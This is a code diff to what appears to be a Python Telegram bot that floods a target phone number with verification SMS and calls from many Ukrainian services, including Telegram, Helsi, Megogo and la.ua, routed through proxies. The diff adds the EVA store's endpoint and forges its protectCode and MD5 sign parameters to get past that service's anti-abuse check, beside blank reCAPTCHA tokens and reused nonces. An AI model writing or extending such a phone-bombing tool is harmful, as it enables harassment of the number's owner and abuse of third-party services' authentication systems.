@@ -26,7 +26,7 @@ from headers_main import (
     headers_smartmedical, cookies_smartmedical, headers_silpo, headers_goodwine,
     headers_finbert, cookies_finbert, headers_brabrabra, cookies_brabrabra,
     headers_workua, cookies_workua, headers_binance, cookies_binance, headers_trafficguard,
-    headers_la
+    headers_la, headers_eva
 )
 import asyncpg
 import config
@@ -1237,6 +1237,12 @@ async def admin_check_services(message: Message):
         ("Ta-Da Call", "https://api.ta-da.net.ua/v1.1/mobile/auth.call", {"json": {"phone": formatted_number9}, "headers": headers_ta_da, "method": "PUT"}, None),
         ("Megogo", "https://megogo.net/wb/authForm_v3/authPhone?lang=ua", {"data": {"target_url": "/ua", "login": "+" + test_number, "action": "widget_5", "g-recaptcha-version": "v3", "g-recaptcha-response": ""}, "headers": {**headers, "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://megogo.net", "Referer": "https://megogo.net/ua/auth_login", "X-Requested-With": "XMLHttpRequest", "Csrf-Token": megogo_csrf_token or ""}, "cookies": megogo_cookies or {}}, None),
     ]
+    
+    # Генеруємо protectCode та sign для EVA
+    eva_protect_code = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
+    eva_sign_string = test_number + eva_protect_code
+    eva_sign = hashlib.md5(eva_sign_string.encode()).hexdigest()
+    services_to_check.append(("EVA", "https://pwa-api.eva.ua/api/user/send-code?storeCode=ua", {"json": {"phone": test_number, "protectCode": eva_protect_code, "sign": eva_sign}, "headers": headers_eva}, None))
     
     async def check_service_status(name, url_or_type, request_params, custom_headers):
         """Перевіряє статус сервісу через тестовий запит"""
@@ -2647,6 +2653,12 @@ async def ukr(number, chat_id, proxy_url=None, proxy_auth=None, proxy_entry=None
         monto_device_id = str(uuid.uuid4())
         monto_fingerprint = monto_device_id  # Вони однакові в прикладі
         
+        # Генеруємо protectCode та sign для EVA
+        eva_protect_code = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
+        # Генеруємо sign як MD5 хеш від phone + protectCode
+        eva_sign_string = number + eva_protect_code
+        eva_sign = hashlib.md5(eva_sign_string.encode()).hexdigest()
+        
         return [
             bounded_request("https://my.telegram.org/auth/send_password", **with_proxy({"data": {"phone": "+" + number}, "headers": headers})),
             bounded_request("https://helsi.me/api/healthy/v2/accounts/login", **with_proxy({"json": {"phone": number, "platform": "PISWeb"}, "headers": headers})),
@@ -2701,6 +2713,7 @@ async def ukr(number, chat_id, proxy_url=None, proxy_auth=None, proxy_entry=None
             bounded_request("https://la.ua/vinnytsya/wp-admin/admin-ajax.php?lang=uk", **with_proxy({"data": {"action": "user_login", "formData": f"tel={urllib.parse.quote(formatted_number_la, safe='')}&code=", "nonce": "1d8ce3c7e4"}, "headers": headers_la})),
             bounded_request("https://api.ta-da.net.ua/v1.1/mobile/auth.call", **with_proxy({"json": {"phone": formatted_number9}, "headers": headers_ta_da, "method": "PUT"})),
             bounded_request("https://megogo.net/wb/authForm_v3/authPhone?lang=ua", **with_proxy({"data": {"target_url": "/ua", "login": "+" + number, "action": "widget_5", "g-recaptcha-version": "v3", "g-recaptcha-response": ""}, "headers": {**headers, "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://megogo.net", "Referer": "https://megogo.net/ua/auth_login", "X-Requested-With": "XMLHttpRequest", "Csrf-Token": megogo_csrf_token or ""}, "cookies": megogo_cookies or {}})),
+            bounded_request("https://pwa-api.eva.ua/api/user/send-code?storeCode=ua", **with_proxy({"json": {"phone": number, "protectCode": eva_protect_code, "sign": eva_sign}, "headers": headers_eva})),
         ]
 
     if not attack_flags.get(chat_id):
